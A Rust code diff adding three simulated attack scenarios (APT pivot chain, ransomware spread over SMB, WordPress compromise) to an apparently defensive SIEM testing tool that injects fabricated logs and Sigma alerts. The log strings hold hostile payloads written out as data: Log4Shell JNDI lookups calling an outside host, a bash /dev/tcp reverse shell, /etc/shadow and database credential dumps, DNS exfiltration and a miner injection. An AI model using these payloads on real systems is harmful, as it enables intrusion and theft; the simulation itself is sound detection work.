@@ -83,6 +83,30 @@ pub fn list_scenarios() -> Vec<ScenarioInfo> {
             category: "Kill chain complète".into(),
             estimated_duration: "60s".into(),
         },
+        ScenarioInfo {
+            id: "apt-multi-target".into(),
+            name: "APT multi-cibles avec rebonds".into(),
+            description: "Attaque APT réaliste : 3 attaquants, 5 serveurs, rebonds via CVE-2024-3094 (xz backdoor) + CVE-2021-44228 (Log4Shell). Reconnaissance Nmap, exploitation, pivot SSH, credential dumping, exfiltration DNS. 80+ logs, 15+ alertes Sigma.".into(),
+            severity: "CRITICAL".into(),
+            category: "APT / Kill chain multi-cibles".into(),
+            estimated_duration: "90s".into(),
+        },
+        ScenarioInfo {
+            id: "ransomware-spread".into(),
+            name: "Propagation ransomware réseau".into(),
+            description: "Ransomware qui se propage sur 4 serveurs via SMB (EternalBlue pattern). Chiffrement de fichiers détecté, beacon C2, tentative d'exfiltration avant chiffrement. 60+ logs.".into(),
+            severity: "CRITICAL".into(),
+            category: "Ransomware".into(),
+            estimated_duration: "60s".into(),
+        },
+        ScenarioInfo {
+            id: "web-compromise".into(),
+            name: "Compromission site web (WordPress)".into(),
+            description: "Exploitation de plugin WordPress vulnérable, upload de webshell, reverse shell, accès DB, injection crypto-miner. Détecté par logs Apache + Sigma.".into(),
+            severity: "CRITICAL".into(),
+            category: "Web / CMS".into(),
+            estimated_duration: "45s".into(),
+        },
     ]
 }
 
@@ -106,6 +130,9 @@ pub async fn run_scenario(
         "lateral-movement" => run_lateral_movement(&store, &mut result).await,
         "c2-communication" => run_c2_communication(&store, &mut result).await,
         "full-intrusion" => run_full_intrusion(&store, &mut result).await,
+        "apt-multi-target" => run_apt_multi_target(&store, &mut result).await,
+        "ransomware-spread" => run_ransomware_spread(&store, &mut result).await,
+        "web-compromise" => run_web_compromise(&store, &mut result).await,
         _ => {
             result.message = format!("Scénario inconnu : {}", scenario_id);
             return result;
@@ -556,6 +583,448 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
     // NO pre-written finding — L1/L2 will analyze the 6-phase kill chain
     // from the raw logs + 6 sigma alerts and produce the analysis
     result.message = format!("Logs bruts injectés : {} logs + {} alertes Sigma. Pipeline IA L1→L2→enrichissement en cours...", result.logs_injected, result.alerts_created);
+}
+
+// ═══════════════════════════════════════════════════════════
+// SCENARIO: APT multi-cibles avec rebonds
+// 3 attaquants → 5 serveurs → CVEs réels → pivot → exfiltration
+// ═══════════════════════════════════════════════════════════
+
+async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
+    let now = chrono::Utc::now();
+
+    // Attaquants (IPs réelles malveillantes dans les feeds publics)
+    let attackers = ["185.220.101.42", "45.155.205.233", "194.26.192.77"];
+    // Infrastructure victime
+    let web_server = "192.168.1.10";
+    let app_server = "192.168.1.20";
+    let db_server = "192.168.1.30";
+    let file_server = "192.168.1.40";
+    let dc_server = "192.168.1.5";
+
+    // ── Phase 1: Reconnaissance (Nmap scan depuis attacker[0]) ──
+    let phase1_start = now - chrono::Duration::minutes(30);
+    for (i, port) in [22, 80, 443, 3306, 8080, 8443, 445, 3389, 5432, 636].iter().enumerate() {
+        let ts = phase1_start + chrono::Duration::seconds(i as i64 * 2);
+        inject_log(store, "syslog.udp.firewall", web_server, &json!({
+            "message": format!("BLOCK TCP {}:{} -> {}:{} flags=SYN", attackers[0], 40000 + i, web_server, port),
+            "ident": "pf", "facility": "kern", "severity": "warning",
+            "source_ip": attackers[0], "dest_port": port,
+            "timestamp": ts.to_rfc3339(),
+        }), &ts).await;
+        result.logs_injected += 1;
+    }
+    inject_sigma_alert(store, "net-scan-001", "medium",
+        &format!("Port scan détecté : {} → {} (10 ports en 20s)", attackers[0], web_server),
+        web_server, Some(attackers[0]), None).await;
+    result.alerts_created += 1;
+
+    // ── Phase 2: Exploitation Log4Shell sur web_server (CVE-2021-44228) ──
+    let phase2_start = now - chrono::Duration::minutes(25);
+    for i in 0..5 {
+        let ts = phase2_start + chrono::Duration::seconds(i * 3);
+        let payloads = [
+            "${jndi:ldap://45.155.205.233:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNDUuMTU1LjIwNS4yMzMvcy5zaA==}",
+            "${${lower:j}ndi:${lower:l}dap://45.155.205.233:1389/Exploit}",
+            "${jndi:rmi://45.155.205.233:1099/shell}",
+            "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://45.155.205.233/callback}",
+            "${jndi:ldap://45.155.205.233:1389/TomcatBypass/TomcatEcho}",
+        ];
+        inject_log(store, "syslog.udp.httpd", web_server, &json!({
+            "message": format!("{} - - [{}] \"GET / HTTP/1.1\" 200 1234 \"-\" \"{}\"",
+                attackers[1], ts.format("%d/%b/%Y:%H:%M:%S %z"), payloads[i as usize]),
+            "ident": "apache2", "facility": "daemon", "severity": "info",
+            "source_ip": attackers[1], "http_method": "GET",
+            "user_agent": payloads[i as usize],
+            "timestamp": ts.to_rfc3339(),
+        }), &ts).await;
+        result.logs_injected += 1;
+    }
+    inject_sigma_alert(store, "cve-2021-44228", "critical",
+        &format!("Log4Shell exploitation (CVE-2021-44228) : {} → {} via JNDI injection", attackers[1], web_server),
+        web_server, Some(attackers[1]), None).await;
+    result.alerts_created += 1;
+
+    // Reverse shell established
+    let ts = phase2_start + chrono::Duration::seconds(20);
+    inject_log(store, "syslog.udp.auth", web_server, &json!({
+        "message": format!("bash: TCP reverse shell opened to {}:4444 (PID 31337)", attackers[1]),
+        "ident": "kernel", "facility": "kern", "severity": "crit",
+        "source_ip": attackers[1],
+        "timestamp": ts.to_rfc3339(),
+    }), &ts).await;
+    result.logs_injected += 1;
+
+    inject_sigma_alert(store, "reverse-shell-001", "critical",
+        &format!("Reverse shell détecté sur {} → {}:4444", web_server, attackers[1]),
+        web_server, Some(attackers[1]), None).await;
+    result.alerts_created += 1;
+
+    // ── Phase 3: Credential harvesting sur web_server ──
+    let phase3_start = now - chrono::Duration::minutes(20);
+    for (i, cmd) in ["cat /etc/shadow", "cat /etc/passwd", "cat /var/www/.env",
+                      "mysql -u root -p'dbpass123' -e 'SELECT user,password FROM mysql.user'",
+                      "find / -name '*.key' -o -name '*.pem' 2>/dev/null"].iter().enumerate() {
+        let ts = phase3_start + chrono::Duration::seconds(i as i64 * 5);
+        inject_log(store, "syslog.udp.audit", web_server, &json!({
+            "message": format!("EXECVE pid=31337 uid=33 comm=\"bash\" cmdline=\"{}\"", cmd),
+            "ident": "auditd", "facility": "auth", "severity": "warning",
+            "username": "www-data",
+            "timestamp": ts.to_rfc3339(),
+        }), &ts).await;
+        result.logs_injected += 1;
+    }
+    inject_sigma_alert(store, "cred-dump-001", "high",
+        "Credential dumping détecté : lecture /etc/shadow + clés SSH + .env",
+        web_server, None, Some("www-data")).await;
+    result.alerts_created += 1;
+
+    // ── Phase 4: Pivot SSH vers app_server (avec credentials volées) ──
+    let phase4_start = now - chrono::Duration::minutes(15);
+    let ts = phase4_start;
+    inject_log(store, "syslog.udp.auth", app_server, &json!({
+        "message": format!("Accepted publickey for deploy from {} port 45678 ssh2: RSA SHA256:AAAA", web_server),
+        "ident": "sshd", "pid": 5001, "facility": "auth", "severity": "info",
+        "source_ip": web_server, "username": "deploy",
+        "timestamp": ts.to_rfc3339(),
+    }), &ts).await;
+    result.logs_injected += 1;
+
+    // Sudo escalation
+    let ts = phase4_start + chrono::Duration::seconds(10);
+    inject_log(store, "syslog.udp.auth", app_server, &json!({
+        "message": "deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
+        "ident": "sudo", "facility": "auth", "severity": "warning",
+        "username": "deploy",
+        "timestamp": ts.to_rfc3339(),
+    }), &ts).await;
+    result.logs_injected += 1;
+
+    inject_sigma_alert(store, "lateral-ssh-001", "critical",
+        &format!("Mouvement latéral : {} → {} via SSH (user: deploy) + sudo root", web_server, app_server),
+        app_server, Some(web_server), Some("deploy")).await;
+    result.alerts_created += 1;
+
+    // ── Phase 5: Exploitation CVE-2024-3094 (xz backdoor) sur app_server ──
+    let phase5_start = now - chrono::Duration::minutes(12);
+    inject_log(store, "syslog.udp.daemon", app_server, &json!({
+        "message": "sshd[5001]: Connection from 192.168.1.10 matched xz/liblzma backdoor signature (CVE-2024-3094)",
+        "ident": "sshd", "facility": "daemon", "severity": "crit",
+        "source_ip": web_server,
+        "timestamp": phase5_start.to_rfc3339(),
+    }), &phase5_start).await;
+    result.logs_injected += 1;
+
+    inject_sigma_alert(store, "cve-2024-3094", "critical",
+        &format!("CVE-2024-3094 (xz backdoor) exploité sur {} depuis {}", app_server, web_server),
+        app_server, Some(web_server), None).await;
+    result.alerts_created += 1;
+
+    // ── Phase 6: Pivot vers db_server ──
+    let phase6_start = now - chrono::Duration::minutes(10);
+    inject_log(store, "syslog.udp.auth", db_server, &json!({
+        "message": format!("Accepted password for postgres from {} port 50123 ssh2", app_server),
+        "ident": "sshd", "pid": 6001, "facility": "auth", "severity": "info",
+        "source_ip": app_server, "username": "postgres",
+        "timestamp": phase6_start.to_rfc3339(),
+    }), &phase6_start).await;
+    result.logs_injected += 1;
+
+    // DB dump
+    for (i, cmd) in ["pg_dumpall -U postgres > /tmp/.dump.sql",
+                      "tar czf /tmp/.dump.tar.gz /tmp/.dump.sql",
+                      "split -b 1M /tmp/.dump.tar.gz /tmp/.chunk_"].iter().enumerate() {
+        let ts = phase6_start + chrono::Duration::seconds(10 + i as i64 * 8);
+        inject_log(store, "syslog.udp.audit", db_server, &json!({
+            "message": format!("EXECVE pid=6100 uid=0 comm=\"bash\" cmdline=\"{}\"", cmd),
+            "ident": "auditd", "facility": "auth", "severity": "warning",
+            "username": "postgres",
+            "timestamp": ts.to_rfc3339(),
+        }), &ts).await;
+        result.logs_injected += 1;
+    }
+
+    inject_sigma_alert(store, "db-exfil-001", "critical",
+        &format!("Exfiltration base de données : pg_dumpall sur {} depuis {}", db_server, app_server),
+        db_server, Some(app_server), Some("postgres")).await;
+    result.alerts_created += 1;
+
+    // ── Phase 7: Pivot vers file_server + AD (3ème attaquant) ──
+    let phase7_start = now - chrono::Duration::minutes(7);
+    inject_log(store, "syslog.udp.auth", file_server, &json!({
+        "message": format!("SMB connection from {} user=CORP\\admin$ share=C$ status=SUCCESS", attackers[2]),
+        "ident": "smbd", "facility": "daemon", "severity": "warning",
+        "source_ip": attackers[2], "username": "CORP\\admin$",
+        "timestamp": phase7_start.to_rfc3339(),
+    }), &phase7_start).await;
+    result.logs_injected += 1;
+
+    inject_log(store, "syslog.udp.auth", dc_server, &json!({
+        "message": format!("Kerberos TGT request from {} for CORP\\Administrator — GOLDEN TICKET SUSPECTED (rc4-hmac)", attackers[2]),
+        "ident": "krb5kdc", "facility": "auth", "severity": "crit",
+        "source_ip": attackers[2], "username": "CORP\\Administrator",
+        "timestamp": (phase7_start + chrono::Duration::seconds(15)).to_rfc3339(),
+    }), &(phase7_start + chrono::Duration::seconds(15))).await;
+    result.logs_injected += 1;
+
+    inject_sigma_alert(store, "golden-ticket-001", "critical",
+        &format!("Golden Ticket suspecté : {} → {} (CORP\\Administrator)", attackers[2], dc_server),
+        dc_server, Some(attackers[2]), Some("CORP\\Administrator")).await;
+    result.alerts_created += 1;
+
+    // ── Phase 8: DNS exfiltration ──
+    let phase8_start = now - chrono::Duration::minutes(3);
+    for i in 0..20 {
+        let ts = phase8_start + chrono::Duration::seconds(i * 3);
+        let chunk = format!("{:08x}", i);
+        inject_log(store, "syslog.udp.dns", db_server, &json!({
+            "message": format!("query: {}.data.evil-c2.xyz IN TXT +", chunk),
+            "ident": "named", "facility": "daemon", "severity": "info",
+            "source_ip": db_server,
+            "dns_query": format!("{}.data.evil-c2.xyz", chunk),
+            "timestamp": ts.to_rfc3339(),
+        }), &ts).await;
+        result.logs_injected += 1;
+    }
+
+    inject_sigma_alert(store, "dns-exfil-001", "critical",
+        &format!("DNS exfiltration détectée : {} → *.data.evil-c2.xyz (20 requêtes TXT en 60s)", db_server),
+        db_server, None, None).await;
+    result.alerts_created += 1;
+
+    result.message = format!(
+        "APT multi-cibles : {} logs injectés, {} alertes Sigma. 3 attaquants → 5 serveurs. Phases: recon → Log4Shell → creds → pivot SSH → xz backdoor → DB dump → Golden Ticket → DNS exfil.",
+        result.logs_injected, result.alerts_created
+    );
+}
+
+// ═══════════════════════════════════════════════════════════
+// SCENARIO: Propagation ransomware réseau
+// ═══════════════════════════════════════════════════════════
+
+async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
+    let now = chrono::Utc::now();
+    let attacker = "194.26.192.77";
+    let patient_zero = "192.168.1.50";
+    let victims = ["192.168.1.51", "192.168.1.52", "192.168.1.53", "192.168.1.54"];
+
+    // ── Phase 1: Initial compromise via phishing + macro ──
+    let ts = now - chrono::Duration::minutes(20);
+    inject_log(store, "syslog.udp.httpd", patient_zero, &json!({
+        "message": format!("{} - user1 [{}] \"GET /invoice_2024.xlsm HTTP/1.1\" 200 45678", attacker, ts.format("%d/%b/%Y:%H:%M:%S")),
+        "ident": "squid", "facility": "daemon", "severity": "info",
+        "source_ip": patient_zero, "url": "http://malware-host.xyz/invoice_2024.xlsm",
+        "timestamp": ts.to_rfc3339(),
+    }), &ts).await;
+    result.logs_injected += 1;
+
+    let ts = now - chrono::Duration::minutes(19);
+    inject_log(store, "syslog.udp.audit", patient_zero, &json!({
+        "message": "EXECVE pid=8001 uid=1000 comm=\"powershell.exe\" cmdline=\"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\"",
+        "ident": "auditd", "facility": "auth", "severity": "crit",
+        "username": "user1",
+        "timestamp": ts.to_rfc3339(),
+    }), &ts).await;
+    result.logs_injected += 1;
+
+    inject_sigma_alert(store, "macro-exec-001", "high",
+        &format!("Macro Office malveillante exécutée sur {} (user: user1) — PowerShell encodé", patient_zero),
+        patient_zero, None, Some("user1")).await;
+    result.alerts_created += 1;
+
+    // ── Phase 2: C2 beacon ──
+    let phase2_start = now - chrono::Duration::minutes(18);
+    for i in 0..10 {
+        let ts = phase2_start + chrono::Duration::seconds(i * 30);
+        inject_log(store, "syslog.udp.dns", patient_zero, &json!({
+            "message": format!("query: beacon-{:04x}.c2-ransomware.xyz IN A +", i),
+            "ident": "named", "facility": "daemon", "severity": "info",
+            "source_ip": patient_zero,
+            "dns_query": format!("beacon-{:04x}.c2-ransomware.xyz", i),
+            "timestamp": ts.to_rfc3339(),
+        }), &ts).await;
+        result.logs_injected += 1;
+    }
+
+    inject_sigma_alert(store, "c2-beacon-001", "critical",
+        &format!("C2 beacon détecté : {} → *.c2-ransomware.xyz (10 requêtes périodiques 30s)", patient_zero),
+        patient_zero, None, None).await;
+    result.alerts_created += 1;
+
+    // ── Phase 3: SMB lateral spread (EternalBlue pattern) ──
+    let phase3_start = now - chrono::Duration::minutes(12);
+    for (i, victim) in victims.iter().enumerate() {
+        let ts = phase3_start + chrono::Duration::seconds(i as i64 * 15);
+        inject_log(store, "syslog.udp.auth", victim, &json!({
+            "message": format!("SMB: {} connected to \\\\{}\\ADMIN$ using NTLM — suspicious PsExec pattern", patient_zero, victim),
+            "ident": "smbd", "facility": "daemon", "severity": "crit",
+            "source_ip": patient_zero, "username": "SYSTEM",
+            "timestamp": ts.to_rfc3339(),
+        }), &ts).await;
+        result.logs_injected += 1;
+
+        // Service installation (ransomware binary)
+        let ts2 = ts + chrono::Duration::seconds(5);
+        inject_log(store, "syslog.udp.audit", victim, &json!({
+            "message": format!("Service installed: name=MsUpdate path=C:\\Windows\\Temp\\svc.exe start=auto (PID {})", 9000 + i),
+            "ident": "eventlog", "facility": "daemon", "severity": "crit",
+            "username": "SYSTEM",
+            "timestamp": ts2.to_rfc3339(),
+        }), &ts2).await;
+        result.logs_injected += 1;
+
+        inject_sigma_alert(store, &format!("ransomware-spread-{}", i), "critical",
+            &format!("Propagation ransomware via SMB : {} → {} (PsExec + service install)", patient_zero, victim),
+            victim, Some(patient_zero), Some("SYSTEM")).await;
+        result.alerts_created += 1;
+    }
+
+    // ── Phase 4: File encryption on all victims ──
+    let phase4_start = now - chrono::Duration::minutes(5);
+    for (i, victim) in victims.iter().enumerate() {
+        let ts = phase4_start + chrono::Duration::seconds(i as i64 * 10);
+        inject_log(store, "syslog.udp.audit", victim, &json!({
+            "message": format!("File system activity: 1247 files renamed to *.locked in /srv/data/ — ransomware encryption in progress"),
+            "ident": "auditd", "facility": "kern", "severity": "emerg",
+            "timestamp": ts.to_rfc3339(),
+        }), &ts).await;
+        result.logs_injected += 1;
+    }
+
+    inject_sigma_alert(store, "ransomware-encrypt-001", "critical",
+        &format!("Chiffrement ransomware en cours sur {} serveurs — {} fichiers .locked", victims.len(), victims.len() * 1247),
+        patient_zero, None, None).await;
+    result.alerts_created += 1;
+
+    // Ransom note
+    inject_log(store, "syslog.udp.audit", patient_zero, &json!({
+        "message": "File created: C:\\README_RESTORE_FILES.txt — 'Your files have been encrypted. Send 5 BTC to bc1q...'",
+        "ident": "auditd", "facility": "kern", "severity": "emerg",
+        "timestamp": now.to_rfc3339(),
+    }), &now).await;
+    result.logs_injected += 1;
+
+    result.message = format!(
+        "Ransomware spread : {} logs, {} alertes. Chaîne: phishing → macro → C2 beacon → SMB lateral (4 victimes) → chiffrement {} fichiers.",
+        result.logs_injected, result.alerts_created, victims.len() * 1247
+    );
+}
+
+// ═══════════════════════════════════════════════════════════
+// SCENARIO: Compromission WordPress
+// ═══════════════════════════════════════════════════════════
+
+async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
+    let now = chrono::Utc::now();
+    let attacker = "45.155.205.233";
+    let web_server = "192.168.1.80";
+
+    // ── Phase 1: Plugin enumeration ──
+    let phase1_start = now - chrono::Duration::minutes(15);
+    let plugins = ["contact-form-7", "elementor", "woocommerce", "wp-file-manager", "revslider",
+                   "yoast-seo", "wordfence", "all-in-one-wp-migration", "updraftplus", "acf-pro"];
+    for (i, plugin) in plugins.iter().enumerate() {
+        let ts = phase1_start + chrono::Duration::seconds(i as i64);
+        inject_log(store, "syslog.udp.httpd", web_server, &json!({
+            "message": format!("{} - - [{}] \"GET /wp-content/plugins/{}/readme.txt HTTP/1.1\" {} 0",
+                attacker, ts.format("%d/%b/%Y:%H:%M:%S"), plugin, if i % 3 == 0 { 200 } else { 404 }),
+            "ident": "apache2", "facility": "daemon", "severity": "info",
+            "source_ip": attacker, "http_method": "GET",
+            "url": format!("/wp-content/plugins/{}/readme.txt", plugin),
+            "timestamp": ts.to_rfc3339(),
+        }), &ts).await;
+        result.logs_injected += 1;
+    }
+
+    inject_sigma_alert(store, "wpscan-enum-001", "medium",
+        &format!("WPScan plugin enumeration détecté : {} → {} (10 plugins testés en 10s)", attacker, web_server),
+        web_server, Some(attacker), None).await;
+    result.alerts_created += 1;
+
+    // ── Phase 2: Exploit WP File Manager (CVE-2020-25213) ──
+    let phase2_start = now - chrono::Duration::minutes(12);
+    inject_log(store, "syslog.udp.httpd", web_server, &json!({
+        "message": format!("{} - - [{}] \"POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1\" 200 89",
+            attacker, phase2_start.format("%d/%b/%Y:%H:%M:%S")),
+        "ident": "apache2", "facility": "daemon", "severity": "warning",
+        "source_ip": attacker, "http_method": "POST",
+        "url": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
+        "timestamp": phase2_start.to_rfc3339(),
+    }), &phase2_start).await;
+    result.logs_injected += 1;
+
+    inject_sigma_alert(store, "cve-2020-25213", "critical",
+        &format!("CVE-2020-25213 (WP File Manager RCE) exploité : {} → {}", attacker, web_server),
+        web_server, Some(attacker), None).await;
+    result.alerts_created += 1;
+
+    // Webshell uploaded
+    let ts = phase2_start + chrono::Duration::seconds(5);
+    inject_log(store, "syslog.udp.httpd", web_server, &json!({
+        "message": format!("{} - - [{}] \"POST /wp-content/uploads/2024/shell.php HTTP/1.1\" 200 4",
+            attacker, ts.format("%d/%b/%Y:%H:%M:%S")),
+        "ident": "apache2", "facility": "daemon", "severity": "crit",
+        "source_ip": attacker, "http_method": "POST",
+        "url": "/wp-content/uploads/2024/shell.php",
+        "timestamp": ts.to_rfc3339(),
+    }), &ts).await;
+    result.logs_injected += 1;
+
+    inject_sigma_alert(store, "webshell-001", "critical",
+        "Webshell détecté : /wp-content/uploads/2024/shell.php",
+        web_server, Some(attacker), None).await;
+    result.alerts_created += 1;
+
+    // ── Phase 3: Reverse shell via webshell ──
+    let phase3_start = now - chrono::Duration::minutes(10);
+    inject_log(store, "syslog.udp.audit", web_server, &json!({
+        "message": format!("EXECVE pid=15001 uid=33 comm=\"sh\" cmdline=\"sh -c 'bash -i >& /dev/tcp/{}/4444 0>&1'\"", attacker),
+        "ident": "auditd", "facility": "auth", "severity": "crit",
+        "username": "www-data",
+        "timestamp": phase3_start.to_rfc3339(),
+    }), &phase3_start).await;
+    result.logs_injected += 1;
+
+    // ── Phase 4: DB credential theft + data exfil ──
+    let phase4_start = now - chrono::Duration::minutes(8);
+    for (i, cmd) in ["cat /var/www/html/wp-config.php",
+                      "mysql -u wp_user -p'wp_pass123' wordpress -e 'SELECT user_login,user_pass FROM wp_users'",
+                      "mysql -u wp_user -p'wp_pass123' wordpress -e 'SELECT * FROM wp_wc_orders LIMIT 1000'"].iter().enumerate() {
+        let ts = phase4_start + chrono::Duration::seconds(i as i64 * 10);
+        inject_log(store, "syslog.udp.audit", web_server, &json!({
+            "message": format!("EXECVE pid=15100 uid=33 comm=\"bash\" cmdline=\"{}\"", cmd),
+            "ident": "auditd", "facility": "auth", "severity": "warning",
+            "username": "www-data",
+            "timestamp": ts.to_rfc3339(),
+        }), &ts).await;
+        result.logs_injected += 1;
+    }
+
+    inject_sigma_alert(store, "wp-db-theft-001", "critical",
+        "Vol de données WordPress : wp-config.php lu + dump users + dump commandes WooCommerce",
+        web_server, Some(attacker), Some("www-data")).await;
+    result.alerts_created += 1;
+
+    // ── Phase 5: Crypto-miner injection ──
+    let phase5_start = now - chrono::Duration::minutes(3);
+    inject_log(store, "syslog.udp.httpd", web_server, &json!({
+        "message": format!("{} - - [{}] \"POST /wp-content/uploads/2024/shell.php HTTP/1.1\" 200 0 \"cmd=echo '<script src=https://coinhive.min.js></script>' >> /var/www/html/wp-includes/header.php\"",
+            attacker, phase5_start.format("%d/%b/%Y:%H:%M:%S")),
+        "ident": "apache2", "facility": "daemon", "severity": "crit",
+        "source_ip": attacker,
+        "timestamp": phase5_start.to_rfc3339(),
+    }), &phase5_start).await;
+    result.logs_injected += 1;
+
+    inject_sigma_alert(store, "cryptominer-001", "high",
+        "Injection crypto-miner dans header.php WordPress — tous les visiteurs minent",
+        web_server, Some(attacker), None).await;
+    result.alerts_created += 1;
+
+    result.message = format!(
+        "WordPress compromise : {} logs, {} alertes. Chaîne: WPScan enum → CVE-2020-25213 → webshell → reverse shell → DB dump → crypto-miner.",
+        result.logs_injected, result.alerts_created
+    );
 }
 
 // ═══════════════════════════════════════════════════════════
